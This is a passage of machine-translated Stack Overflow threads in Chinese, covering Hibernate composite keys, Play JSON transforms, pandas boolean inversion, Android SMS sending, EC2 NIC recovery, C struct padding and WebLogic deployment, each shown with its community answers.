        @ManyToOne
        @JoinColumn(name="MESSAGE_ID")
        private SMail messageId;

        // required no arg constructor
        public MailboxMessagesId() {}

        public MailboxMessagesId(Mailbox mailbox, SMail mail) {
            this.mailboxId = mailbox;
            this.messageId = mail;
        }

        public MailboxMessagesId(int mailboxId, int messageId) {
            this(new Mailbox(mailboxId), new SMail(messageId));
        }

        @Override
        public boolean equals(Object instance) {
            if (instance == null)
                return false;

            if (!(instance instanceof MailboxMessagesId))
                return false;

            final MailboxMessagesId other = (MailboxMessagesId) instance;

            if (!(mailboxId.getMailboxId()==(other.getMailboxId().getMailboxId())))
                return false;

            if (!(messageId.getMessageId()==(other.getMessageId().getMessageId())))
                return false;

            return true;
        }

        @Override
        public int hashCode() {
            int hash = 7;
            hash = 47 * hash + (this.mailboxId != null ? this.mailboxId.hashCode() : 0);
            hash = 47 * hash + (this.messageId != null ? this.messageId.hashCode() : 0);
            return hash;
        }

        //Getters and setters
    }
    //Constructors and getters and setters
} 
```

现在真正的问题是休眠只是为邮箱类创建表。所以我想问题可能出在其他两个班级。我尝试了亚瑟罗纳德的确切解决方案；它工作得很好。你能帮我找出我在代码中可能犯的错误吗？并且如果在 MailboxMessage 类中创建复合键的这种技术有任何替代方法

编辑1：

发现的问题之一是我使用“from”作为我的成员字段，它是 sql 的保留关键字。谁会想到呢？但问题仍然存在。现在我确实有一个用于 smail 类的表，但仍然没有为 MailboxMessages 类创建表。请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T12:16:51.973

自己找到了解决方案：问题在于在 SMail 类中使用“from”作为数据成员，在 MailboxMessages 类中使用“read”作为数据成员，因为它们是 mysql 的保留关键字。现在我所有的表都是用复合键创建的，更不用说。（通过数据库确认）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:01:14.473

我认为这是例如字段名称只是示例的解决方案：

```
@Id
@Column(name = "EMP_NO_FK" , unique=true , nullable = false ,length=10)
private Long empno;

@Id
@Column(name = "GROUP_NO_FK" , unique=true , nullable = false ,length=5)
private Long  groupNo;

@Id
@Column(name = "DEPT_NO_FK" , unique=true , nullable = false ,length=10)
private Long deptno;

@Id
@Column(name = "YEAR_NAME_M_FK" , unique=true , nullable = false ,length=4)
private Integer  year; 
```

# json - 播放 JSON 可选转换器

> ID：15998181
> 
> 赞同：9
> 
> 时间：2013-04-14T10:43:54.913
> 
> 标签：json, scala, playframework

我正在使用 Play 2.1 JSON Reads 来实现条件转换。

我有一个 json 对象，我想转换一个删除 \n 字符的可选字段。问题是，如果我从发送的 JSON 中删除内容，我会收到验证错误。

该字段是可选的，我不知道如何描述转换是可选的。这是当前的内容转换：

```
 val transformContent = (__ \ 'content).json.update(__.read[JsString].map{ 
         value =>
        JsString(value.value.replaceAll("\n", ""))
  }) 
```

如何获得可选的字段转换？我应该使用`Reads.verifyingIf`吗？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-14T12:08:21.967

你可以这样做：

```
val json = Json.obj("whatever" -> 1, "content" -> "hello world")
val json2 = Json.obj("whatever" -> 1)

val transformer = (__ \ 'content).json.update(
  __.readOpt[JsString].map{
    case Some(JsString(str)) => JsString(str.replaceAll("world", "scala"))
  }
).orElse(__.json.pick[JsObject])

json.transform(transformer)
//JsSuccess({"whatever":1,"content":"hello scala"},)
json2.transform(transformer)
//JsSuccess({"whatever":1},) 
```

有点hacky，但它有效。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-05-14T02:40:00.563

几年后，我不得不改变一些东西才能让它发挥作用：

```
val json = Json.obj("whatever" -> 1, "content" -> "hello world")
val json2 = Json.obj("whatever" -> 1)

val transformer = (__ \ 'content).json.update(
  __.read[JsString].map {
    case JsString(str) => JsString(str.replaceAll("world", "scala"))
  }
).orElse(__.json.pick[JsObject])

json.transform(transformer)
//JsSuccess({"whatever":1,"content":"hello scala"},)
json2.transform(transformer)
//JsSuccess({"whatever":1},) 
```

如果字符串不存在，则读取失败，因此 orElse 方法会处理 JsError。

# javascript - 如何在 grails 中使用 easyslider？

> ID：15998182
> 
> 赞同：0
> 
> 时间：2013-04-14T10:43:58.100
> 
> 标签：javascript, grails, easyslider

如何在 grails 中实现 easyslider 1.7？我知道您必须包含 g:javascript 标签，但是如何修改这部分的代码：

```
 <script type="text/javascript">
    $(document).ready(function(){   
        $("#slider").easySlider({
            auto: true, 
            continuous: true,
            numeric: true
        });
    }); 
    </script> 
```

我是 grails 的新手，非常感谢您的帮助！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T17:58:22.213

最简单的方法是在`conf/ApplicationResources.groovy`.

```
modules = {
    'slider_resources' {
        resource url: 'css/slider.css'
        resource url: 'js/slider.js'
    }
} 
```

可以通过以下方式轻松将其包含在您的 GSP 文件中：

```
<r:require module="slider_resources" /> 
```

要使用这种机制，需要安装资源插件。

见[http://grails.org/plugin/resources](http://grails.org/plugin/resources)

# php - 在wordpress中传递值思想switch case php

> ID：15998187
> 
> 赞同：0
> 
> 时间：2013-04-14T10:44:22.980
> 
> 标签：php, wordpress, switch-statement, meta-boxes

嗨，我正在为 wordpress 制作一个 metabox 插件并遇到问题：

从元框（元框有一个文本区域和一个收音机）获取信息时，我使用：

```
foreach ($rian_meta_box['fields'] as $field) {
    $meta = get_post_meta($post->ID, $field['id'], true);
switch ($field['type']) {

        case 'radio':

                    *some code, get the radio value and put in a variable $aaa*

        break;

        case 'textarea':

                    *some code, and after I should use the $aaa variable with his value  of the radio case*

                    break; 
```

我试过了，但在 textarea 的情况下，变量是空的，我应该怎么做才能传递它？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-14T10:50:56.993

我不完全知道您尝试实现此功能的场景，但“switch-case”对此是个坏主意。

我看到你在 case radio 下为 $aaa 赋值 - 但是有一个 break 语句打破了 switch case 循环，所以 textarea case 永远不会被执行。

只需尝试“if-then”语句

if (val of radio button is something) then $aaa = something; 文本区域值 = $aaaa;

高温高压

# python - 如何获得熊猫系列的元素逻辑非？

> ID：15998188
> 
> 赞同：298
> 
> 时间：2013-04-14T10:44:28.963
> 
> 标签：python, pandas, operators, boolean-logic

我有一个`Series`包含布尔值的熊猫对象。如何获得包含`NOT`每个值的逻辑的系列？

例如，考虑一个包含以下内容的系列：

```
True
True
True
False 
```

我想获得的系列将包含：

```
False
False
False
True 
```

这似乎应该相当简单，但显然我放错了我的魔力=（

* * *

## 回答 #1

> 赞同：345
> 
> 时间：2013-04-14T12:20:27.223

要反转布尔系列，请[使用`~s`](http://pandas.pydata.org/pandas-docs/stable/indexing.html#boolean-indexing)：

```
In [7]: s = pd.Series([True, True, False, True])

In [8]: ~s
Out[8]: 
0    False
1    False
2     True
3    False
dtype: bool 
```

使用 Python2.7、NumPy 1.8.0、Pandas 0.13.1：

```
In [119]: s = pd.Series([True, True, False, True]*10000)

In [10]:  %timeit np.invert(s)
10000 loops, best of 3: 91.8 µs per loop

In [11]: %timeit ~s
10000 loops, best of 3: 73.5 µs per loop

In [12]: %timeit (-s)
10000 loops, best of 3: 73.5 µs per loop 
```

从 Pandas 0.13.0 开始，Series 不再是 ; 的子类`numpy.ndarray`。它们现在是`pd.NDFrame`. 这可能与为什么`np.invert(s)`不再像`~s`or一样快有关`-s`。

警告：`timeit`结果可能会因许多因素而异，包括硬件、编译器、操作系统、Python、NumPy 和 Pandas 版本。

* * *

## 回答 #2

> 赞同：57
> 
> 时间：2017-03-10T15:10:11.237

@unutbu 的答案很准确，只是想添加一个警告，即您的掩码需要是 dtype bool，而不是“对象”。即你的面具不可能*有*任何nan。看[这里](http://pandas.pydata.org/pandas-docs/stable/gotchas.html#na-type-promotions)- 即使你的面具现在是无 nan 的，它仍将保持“对象”类型。

“对象”系列的倒数不会引发错误，而是会得到一个无法按预期工作的整数垃圾掩码。

```
In[1]: df = pd.DataFrame({'A':[True, False, np.nan], 'B':[True, False, True]})
In[2]: df.dropna(inplace=True)
In[3]: df['A']
Out[3]:
0    True
1   False
Name: A, dtype object
In[4]: ~df['A']
Out[4]:
0   -2
0   -1
Name: A, dtype object 
```

在与同事讨论这个问题后，我有一个解释：看起来 pandas 正在恢复为按位运算符：

```
In [1]: ~True
Out[1]: -2 
```

正如@geher 所说，您可以使用 astype 将其转换为 bool，然后再使用 ~

```
~df['A'].astype(bool)
0    False
1     True
Name: A, dtype: bool
(~df['A']).astype(bool)
0    True
1    True
Name: A, dtype: bool 
```

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2013-04-14T10:53:08.627

我只是试一试：

```
In [9]: s = Series([True, True, True, False])

In [10]: s
Out[10]: 
0     True
1     True
2     True
3    False

In [11]: -s
Out[11]: 
0    False
1    False
2    False
3     True 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-04-14T10:58:01.740

您还可以使用[`numpy.invert`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.invert.html)：

```
In [1]: import numpy as np

In [2]: import pandas as pd

In [3]: s = pd.Series([True, True, False, True])

In [4]: np.invert(s)
Out[4]: 
0    False
1    False
2     True
3    False 
```

编辑：性能差异出现在 Ubuntu 12.04、Python 2.7、NumPy 1.7.0 上——虽然使用 NumPy 1.6.2 似乎不存在：

```
In [5]: %timeit (-s)
10000 loops, best of 3: 26.8 us per loop

In [6]: %timeit np.invert(s)
100000 loops, best of 3: 7.85 us per loop

In [7]: %timeit ~s
10000 loops, best of 3: 27.3 us per loop 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-08-04T21:16:33.030

为了支持此处的出色答案，并且为了将来的方便，可能存在您想要翻转列中的真值并使其他值保持不变（例如nan值）的情况

```
In[1]: series = pd.Series([True, np.nan, False, np.nan])
In[2]: series = series[series.notna()] #remove nan values

In[3]: series # without nan                                            
Out[3]: 
0     True
2    False
dtype: object

# Out[4] expected to be inverse of Out[3], pandas applies bitwise complement 
# operator instead as in `lambda x : (-1*x)-1`

In[4]: ~series
Out[4]: 
0    -2
2    -1
dtype: object 
```

作为一个简单的非矢量化解决方案，您可以： 1\. 检查类型 2。逆布尔值

```
In[1]: series = pd.Series([True, np.nan, False, np.nan])

In[2]: series = series.apply(lambda x : not x if x is bool else x)
Out[2]: 
Out[2]: 
0     True
1      NaN
2    False
3      NaN
dtype: object 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-02-28T10:43:28.420

NumPy 速度较慢，因为它将输入转换为布尔值（因此 None 和 0 变为 False，其他一切都变为 True）。

```
import pandas as pd
import numpy as np
s = pd.Series([True, None, False, True])
np.logical_not(s) 
```

给你

```
0    False
1     True
2     True
3    False
dtype: object 
```

而 ~s 会崩溃。在大多数情况下，波浪号是比 NumPy 更安全的选择。

熊猫 0.25，NumPy 1.17

# android - SMS 发送在 2.2 Froyo 中有效，但在 ICS 4.0 中无效

> ID：15998189
> 
> 赞同：1
> 
> 时间：2013-04-14T10:44:30.933
> 
> 标签：android, sms, android-4.0-ice-cream-sandwich

我正在开发一个发送短信并接收一些响应的应用程序。

现在的问题是 SMS 发送在 2.2 froyo 中工作正常，但在 ICS 4.0 中无法正常工作。

我在我的代码中完成了以下操作：

1.  在我的 Manifest tp 中添加了接收和发送 SMS 的权限。

    ```
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/> 
    ```

2.  这是我在按钮中用来发送短信的代码。

    ```
    public void sendSms(String phoneNumber,String sms) {      
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNumber, null ,sms,  null, null);            
    } 
    ```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-02T15:36:08.117

@rciovati 感谢您的建议，我使用 SMS 方法添加了两个待处理的意图，现在一切正常这是代码

```
SmsManager smsManager=SmsManager.getDefault();
 String SENT = "SMS_SENT";
 String DELIVERED = "SMS_DELIVERED";     
 public void sendSms(String phoneNumber,String sms){
     PendingIntent pi = PendingIntent.getActivity(this, 0,
                new Intent(this, myService.class), 0);   
     PendingIntent sentPI = PendingIntent.getBroadcast(this, 0,
                new Intent(SENT), 0);

            PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0,
                new Intent(DELIVERED), 0);

     //---when the SMS has been sent---
        registerReceiver(new BroadcastReceiver(){
            @Override
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode())
                {
                    case Activity.RESULT_OK:
                        Toast.makeText(getBaseContext(), "SMS sent", 
                                Toast.LENGTH_SHORT).show();
                        break;
                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                        Toast.makeText(getBaseContext(), "Generic failure", 
                                Toast.LENGTH_SHORT).show();
                        break;
                    case SmsManager.RESULT_ERROR_NO_SERVICE:
                        Toast.makeText(getBaseContext(), "No service", 
                                Toast.LENGTH_SHORT).show();
                        break;
                    case SmsManager.RESULT_ERROR_NULL_PDU:
                        Toast.makeText(getBaseContext(), "Null PDU", 
                                Toast.LENGTH_SHORT).show();
                        break;
                    case SmsManager.RESULT_ERROR_RADIO_OFF:
                        Toast.makeText(getBaseContext(), "Radio off", 
                                Toast.LENGTH_SHORT).show();
                        break;
                }
            }
        }, new IntentFilter(SENT));

        //---when the SMS has been delivered---
        registerReceiver(new BroadcastReceiver(){
            @Override
            public void onReceive(Context arg0, Intent arg1) {
                switch (getResultCode())
                {
                    case Activity.RESULT_OK:
                        Toast.makeText(getBaseContext(), "SMS delivered", 
                                Toast.LENGTH_SHORT).show();
                        break;
                    case Activity.RESULT_CANCELED:
                        Toast.makeText(getBaseContext(), "SMS not delivered", 
                                Toast.LENGTH_SHORT).show();
                        break;                        
                }
            }
        }, new IntentFilter(DELIVERED));

        smsManager.sendTextMessage(phoneNumber, null, sms, sentPI, deliveredPI);

    } 
```

# python - 无法在 Python Tkinter 中制作类似桌面的容器

> ID：15998191
> 
> 赞同：3
> 
> 时间：2013-04-14T10:44:43.283
> 
> 标签：python, python-2.7, tkinter

我需要在 Python 中制作一个桌面容器类型的框架，以便从菜单栏中选择窗口将在该桌面窗格中打开的选项，就像我们用来处理专业应用程序一样。

这是 GUI 的快照。在快照中，上面的菜单栏也有很多级联选项。As the User choose the cascaded option, a new window should open below the Menu bar (Empty space in snap), and when the other option is chosen the previous frame should also be there and these sub frames should also have close,minimize and maximize按钮（例如最小化最小化到状态栏上方框架空间的底部

![五月申请](https://i.stack.imgur.com/cjMEo.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T13:23:38.563

您正在尝试创建通常称为“多文档界面”或 MDI 的内容。这在 80 年代和 90 年代初很流行，但现在普遍认为可用性很差。

Tkinter 本身并不支持 MDI 应用程序。您必须自己完成所有窗口管理。通常这意味着您将为包含窗口使用画布，然后在画布中嵌入框架以表示您的窗口。您必须绘制自己的窗口边框并处理大小调整。我已经看到它完成了，但通常不值得努力实施。

# amazon-web-services - 在 AWS EC2 实例上通过 RDP 禁用 NIC

> ID：15998198
> 
> 赞同：2
> 
> 时间：2013-04-14T10:45:09.280
> 
> 标签：amazon-web-services, amazon-ec2, registry, admin

我犯了一个错误 - 在 AWS EC2 实例上禁用了 NIC。目前我正在尝试访问它。谷歌搜索给了我 3 种可能的解决方案：

1.  创建 VPC 并为其添加 NIC - 这对我不起作用。实际上，即使从 VPC 内的另一台机器我也无法访问它。
2.  分离卷并附加到其他实例。加载注册表配置单元并尝试通过注册表设置启用 NIC - 这对我也不起作用。似乎有大约 100 个键需要更改（创建 2 个注册表快照并比较它们） - 不值得一试。
3.  分离卷并附加到其他实例。加载注册表配置单元并尝试设置 AutoAdminLogon。并将脚本添加
    `netsh interface set interface "Local Area Connection 2" enabled`
    到 HKLM/.../RunOnce 文件夹。

* * *

这第三个解决方案对我不起作用，因为 AutoLogon 由于某种原因不起作用。我确定 AutoLogon 不起作用，因为在另一种情况下，来自 RunOnce 文件夹的密钥将被删除。但它仍然存在！

我创建了一个新实例（让它成为 Instance0），去注册并设置 3 个键：AutoAdminLogon、DefaultUserName 和 DefaultPassword。将带有“netsh ...”的密钥添加到 RunOnce 文件夹。禁用 NIC，重新启动实例，然后......它工作了！然后我在这个实例上禁用 NIC。创建一个新实例 - Instance1。从 Instance0 附加卷。加载“%Instance0-Windows%\System32\config\SOFTWARE”配置单元（它是 HKLM/软件）。进行与我相同的操作，将卷附加到 Instace0，启动它，然后......它不起作用！我的猜测是，为本地计算机设置密钥和使用加载配置单元为非本地计算机的注册表设置密钥之间存在一些差异。

谁能帮我解决这个问题？问题不是“为什么自动登录不起作用？” 问题是“如何访问 Instance0？” 对我来说，如果 autoLogon 有效，通过 autoLogon 访问将非常容易。如果有人知道不同的方法，那将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-05-20T04:27:54.103

很简单，只需在 ES2 实例上的同一个可建议区分配一个新的 NIC，然后将新的 NIC 附加到实例并分配新的 Elastic IP 并将其关联到新的 NIC，然后使用远程登录登录到 EC2 实例使用新的弹性 IP。

登录到 ES2 实例后，您可以选择重新连接旧的本地连接或保持新的本地连接，最佳做法是重新连接旧的连接，因为它增加了实例可用的带宽。

祝你有愉快的一天 ：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-22T09:59:07.063

简单的方法是从该实例创建一个 AMI。然后使用用户数据代码（Powershell 脚本）启动 AMI 以启用 NIC

[亚马逊弹性计算云 -> 用户数据](http://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/UsingConfig_WinAMI.html)

[使用 PowerShell 启用和禁用网络适配器](http://blogs.technet.com/b/heyscriptingguy/archive/2014/01/13/enabling-and-disabling-network-adapters-with-powershell.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-09T05:05:07.177

If anyone else needs this in future this is how i resolved my issue.

Added a new network interface via the console. attached an elastic IP to the new nic connected via RDP to the new elastic IP removed the new nic and reverted back to the original one. disconnected via RDP reconnected on the original and it worked.

# c - 结构填充信息

> ID：15998200
> 
> 赞同：4
> 
> 时间：2013-04-14T10:45:17.053
> 
> 标签：c, struct, padding, unions, bit-fields

```
struct abc
{
  char arr[7];
  char arr1[2];
  int i:24;
}; 
```

在上面使用 sizeof 运算符的结构中，我得到了它的大小 12 字节。但根据我的计算（可能是错误的）它应该是 16 字节。为什么它给出 12 个字节？

另一个问题：

根据 C99 第 6.7.2.1 节第 14 段

> 结构或联合对象的每个非位字段成员都以适合其类型的实现定义的方式对齐。

对于特定的实现，我从哪里可以获得描述特定编译器（例如 gcc）如何在结构中引入填充的文档？对于特定架构的所有编译器是否有任何通用规则？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:24:18.300

结构布局是实现定义的。事实证明，例如，GCC 使用的默认布局与 MSVC 使用的布局不同。我猜您已经习惯了 MSVC 布置包含位域的结构的方式。

当然，还有一个 GCC 属性，`ms_struct`允许您更改行为。[这在文档](http://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html#i386-Variable-Attributes)中有更详细的描述。

所以，这个结构的大小为 16：

```
struct abc
{
  char arr[7];
  char arr1[2];
  int i:24;
} __attribute__((ms_struct)); 
```

如果您使用该`gcc_struct`选项（默认值），则大小为 12。

> 对于特定的实现，我从哪里可以获得描述特定编译器（例如 GCC）如何在结构中引入填充的文档？

您需要查阅每个编译器的文档。在 GCC 的情况下，[文档说](http://gcc.gnu.org/onlinedocs/gcc-4.8.0/gcc/Structures-unions-enumerations-and-bit_002dfields-implementation.html#Structures-unions-enumerations-and-bit_002dfields-implementation)：

> **4.9 结构、联合、枚举和位域**
> 
> *   使用不同类型的成员访问联合对象的成员 (C90 6.3.2.3)。
>     
>     对象表示的相关字节被视为用于访问的类型的对象。请参阅类型双关语。这可能是一个陷阱表示。
>     
>     
> *   将“普通” int 位域视为有符号 int 位域还是无符号 int 位域（C90 6.5.2、C90 6.5.2.1、C99 6.7.2、C99 6.7.2.1）。
>     
>     默认情况下，它被视为有符号整数，但这可以通过 -funsigned-bitfields 选项进行更改。
>     
>     
> *   _Bool、signed int 和 unsigned int (C99 6.7.2.1) 以外的允许位域类型。
>     
>     在严格符合模式下不允许使用其他类型。
>     
>     
> *   位域是否可以跨越存储单元边界（C90 6.5.2.1，C99 6.7.2.1）。
>     
>     由 ABI 确定。
>     
>     
> *   一个单元内位域的分配顺序（C90 6.5.2.1，C99 6.7.2.1）。
>     
>     由 ABI 确定。
>     
>     
> *   结构的非位域成员的对齐（C90 6.5.2.1，C99 6.7.2.1）。
>     
>     由 ABI 确定。
>     
>     
> *   与每个枚举类型兼容的整数类型（C90 6.5.2.2、C99 6.7.2.2）。
>     
>     通常，如果枚举中没有负值，则类型为 unsigned int，否则为 int。如果指定了-fshort-enums，那么如果有负值，它是可以表示所有值的signed char、short和int中的第一个，否则它是unsigned char、unsigned short和unsigned int中第一个可以表示所有值的价值。
>     
>     在某些目标上，-fshort-enums 是默认值；这是由 ABI 决定的。

所以，总的来说，你需要弄清楚你的平台的 ABI 是什么。对于任何编译器来说，这确实是明智之举。如果它不根据 ABI 布局结构，那么它会使互操作变得非常棘手。

有点奇怪的是，GCC 对 Windows 上的 ABI 的看法与 MSVC 实现不同。我不知道为什么会这样。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T11:14:28.120

这很简单。

```
struct abc
{
  char arr[7];  // occupies 7 bytes
  char arr1[2]; // occupies 2 bytes
  int i:24;     // occupies 3 bytes
}; 
```

现在，在（的`i`）的第三个声明中，只需要 3 个字节。您已经拥有如下：

```
0 1 2 3 // All 4 bytes used for `char arr[7]`
0 1 2 3 // 3 more used for `char arr[7]`, 1 used for `char arr1[2]`
0 1 2 3 // 1 used for `char arr1[2]`, and the remaining 3 bytes will be used for `int i:24` 
```

但是如果你使用`int i`（无位域），它会消耗 16 个字节，因为

```
0 1 2 3 // All 4 bytes used for `char arr[7]`
0 1 2 3 // 3 more used for `char arr[7]`, 1 used for `char arr1[2]`
0 1 2 3 // 1 used for `char arr1[2]`, there are still 3 bytes but we need 4 bytes for an `int`
0 1 2 3 // So the compiler will allocate a new 4 byte chunk for `int i` 
```

我想现在已经很清楚了。

# javascript - Javascript：如何检查一个 CSS 样式，然后更改另一个 CSS 样式？

> ID：15998201
> 
> 赞同：1
> 
> 时间：2013-04-14T10:45:34.180
> 
> 标签：javascript, css, function, styles

我正在尝试检查命名的`left`css 属性是否等于，然后如果等于 true，则将另一个命名的属性更改为.`div``#right``0%``display``div``#menu``'none'`

我知道要获得 CSS 样式，您可以使用以下函数：

```
document.getElementById("right").style.left = '0%' 
```

但我不知道如何始终运行此功能，以便在左侧样式等于`0%`时，隐藏菜单 div。

我已经尝试了很多方法来做到这一点，但似乎无法让它发挥作用。也许有更好的方法来实现这一点。

任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T04:21:21.903

要更广泛地思考，只需使用*getComputedStyle()*函数。它返回带有元素 CSS 属性值的字符串：

```
console.log(getComputedStyle(someElement).opacity) //0.5
console.log(getComputedStyle(someElement).width) //47px
//and on, and on… 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-14T11:30:57.100

**第一步**：创建函数

```
function setMenuDisplay() {
  var right = document.getElementById("right");
  var menu = document.getElementById("menu");
  menu.style.display = right.offsetLeft ? "block" : "none";
} 
```

**第 2 步**`#right`：在任何可以更改属性`left`（window.onload、window.onresize 或任何影响页面内容的函数）的情况下调用此函数

# spring - 将 Enterprise Archive 部署到 weblogic 10.3.4.0 应用服务器

> ID：15998205
> 
> 赞同：1
> 
> 时间：2013-04-14T10:45:54.670
> 
> 标签：spring, hibernate, weblogic

我正在尝试将企业存档部署到 Web 逻辑应用程序服务器中。这个耳朵包含两个模块。Web 服务模块和 Web 应用程序模块。

此应用程序以前在 Apache Tomcat 服务器上运行，现在我正在迁移到 Web 逻辑应用程序服务器。

部署到 Web 逻辑应用程序服务器时出现以下错误。以下异常。

对于 Web 服务和 Web 应用程序，我使用的是 Hibernate 和 Spring 框架。以下是web服务的依赖

```
[INFO]
[INFO] Building WebServiceModule Maven Webapp 1.0-SNAPSHOT
[INFO]
[INFO]
[INFO] --- maven-dependency-plugin:2.1:tree (default-cli) @ MavenWebAppModule ---
[INFO] com.packt.maven:MavenWebAppModule:war:1.0-SNAPSHOT
[INFO] +- com.packt.maven:BusinessLogicModule:jar:1.0-SNAPSHOT:compile
[INFO] | +- com.packet.maven:DataPersistanceModule:jar:1.0-SNAPSHOT:compile
[INFO] | \- com.packt.maven:DataModelModule:jar:1.0-SNAPSHOT:compile
[INFO] +- com.packt.maven:WebServiceClientModule:jar:1.0-SNAPSHOT:compile
[INFO] +- org.apache.struts:struts2-core:jar:2.1.8:compile
[INFO] | +- com.opensymphony:xwork-core:jar:2.1.6:compile
[INFO] | | \- org.springframework:spring-test:jar:2.5.6:compile
[INFO] | +- org.freemarker:freemarker:jar:2.3.15:compile
[INFO] | +- ognl:ognl:jar:2.7.3:compile
[INFO] | +- commons-fileupload:commons-fileupload:jar:1.2.1:compile
[INFO] | \- commons-io:commons-io:jar:1.3.2:compile
[INFO] +- org.apache.struts:struts2-spring-plugin:jar:2.1.8:compile
[INFO] | +- org.springframework:spring-beans:jar:2.5.6:compile
[INFO] | +- org.springframework:spring-core:jar:2.5.6:compile
[INFO] | \- org.springframework:spring-context:jar:2.5.6:compile
[INFO] | \- aopalliance:aopalliance:jar:1.0:compile
[INFO] +- xml-apis:xml-apis:jar:1.0.b2:provided (scope not updated to compile)
[INFO] +- javassist:javassist:jar:3.12.1.GA:compile
[INFO] +- com.oracle:ojdbc6:jar:11.2.0:compile
[INFO] +- org.springframework:spring:jar:2.5.6:compile
[INFO] +- org.springframework:spring-web:jar:2.5.6:compile
[INFO] +- org.hibernate:hibernate:jar:3.2.7.ga:compile
[INFO] | +- net.sf.ehcache:ehcache:jar:1.2.3:compile
[INFO] | +- javax.transaction:jta:jar:1.0.1B:compile
[INFO] | \- asm:asm-attrs:jar:1.5.3:compile
[INFO] +- dom4j:dom4j:jar:1.6.1:compile
[INFO] +- commons-logging:commons-logging:jar:1.1.1:compile
[INFO] +- commons-collections:commons-collections:jar:3.2.1:compile
[INFO] +- cglib:cglib:jar:2.2:compile
[INFO] +- antlr:antlr:jar:2.7.7:compile
[INFO] +- asm:asm:jar:3.3:compile
[INFO] +- javax.xml.soap:saaj-api:jar:1.3.3:compile
[INFO] | \- javax.activation:activation:jar:1.1:compile
[INFO] +- com.sun.xml.messaging.saaj:saaj-impl:jar:1.3.4:compile
[INFO] | \- org.jvnet:mimepull:jar:1.4:compile
[INFO] \- junit:junit:jar:3.8.1:test (scope not updated to compile)
[INFO] 
```

以下是maven web app模块的依赖

```
[INFO]
[INFO] Building MavenWebAppModule Maven Webapp 1.0-SNAPSHOT
[INFO]
[INFO]
[INFO] --- maven-dependency-plugin:2.1:tree (default-cli) @ WebServiceModule ---
[INFO] com.packt.maven:WebServiceModule:war:1.0-SNAPSHOT
[INFO] +- org.springframework:spring:jar:2.5.6:compile
[INFO] +- org.springframework:spring-web:jar:2.5.6:compile
[INFO] | +- org.springframework:spring-beans:jar:2.5.6:compile
[INFO] | +- org.springframework:spring-context:jar:2.5.6:compile
[INFO] | | \- aopalliance:aopalliance:jar:1.0:compile
[INFO] | \- org.springframework:spring-core:jar:2.5.6:compile
[INFO] +- xml-apis:xml-apis:jar:1.0.b2:provided (scope not updated to compile)
[INFO] +- javax:javaee-api:jar:6.0:provided
[INFO] +- junit:junit:jar:3.8.1:test (scope not updated to compile)
[INFO] +- com.oracle:ojdbc6:jar:11.2.0:compile
[INFO] +- org.hibernate:hibernate:jar:3.2.7.ga:compile
[INFO] | +- net.sf.ehcache:ehcache:jar:1.2.3:compile
[INFO] | +- javax.transaction:jta:jar:1.0.1B:compile
[INFO] | \- asm:asm-attrs:jar:1.5.3:compile
[INFO] +- dom4j:dom4j:jar:1.6.1:compile
[INFO] +- commons-logging:commons-logging:jar:1.1.1:compile
[INFO] +- commons-collections:commons-collections:jar:3.2.1:compile
[INFO] +- cglib:cglib:jar:2.2:compile
[INFO] +- antlr:antlr:jar:2.7.7:compile
[INFO] +- com.sun.xml.ws:jaxws-rt:jar:2.2.3:compile
[INFO] | +- javax.xml.ws:jaxws-api:jar:2.2.3:compile
[INFO] | | +- javax.xml.bind:jaxb-api:jar:2.2.2:compile
[INFO] | | \- org.glassfish:javax.annotation:jar:3.1-b35:compile
[INFO] | +- com.sun.xml.bind:jaxb-impl:jar:2.2.3-1:compile
[INFO] | +- com.sun.xml.messaging.saaj:saaj-impl:jar:1.3.8:compile
[INFO] | +- com.sun.xml.stream.buffer:streambuffer:jar:1.2:compile
[INFO] | +- org.codehaus.woodstox:wstx-asl:jar:3.2.1:compile
[INFO] | | \- stax:stax-api:jar:1.0.1:compile
[INFO] | +- org.jvnet.staxex:stax-ex:jar:1.4:compile
[INFO] | | \- javax.xml.stream:stax-api:jar:1.0-2:compile
[INFO] | +- com.sun.org.apache.xml.internal:resolver:jar:20050927:compile
[INFO] | +- org.jvnet:mimepull:jar:1.5:compile
[INFO] | +- com.sun.xml.ws:policy:jar:2.2.2:compile
[INFO] | | +- com.sun.xml.txw2:txw2:jar:20090102:compile
[INFO] | | \- com.sun.istack:istack-commons-runtime:jar:2.2.1:compile
[INFO] | +- org.glassfish.gmbal:gmbal-api-only:jar:3.1.0-b001:compile
[INFO] | | \- org.glassfish.external:management-api:jar:3.0.0-b012:compile
[INFO] | \- org.glassfish.ha:ha-api:jar:3.1.8:compile
[INFO] +- asm:asm:jar:3.3:compile
[INFO] \- org.jvnet.jax-ws-commons.spring:jaxws-spring:jar:1.8:compile
[INFO] +- javax.servlet:servlet-api:jar:2.5:compile
[INFO] +- org.apache.xbean:xbean-spring:jar:2.7:compile
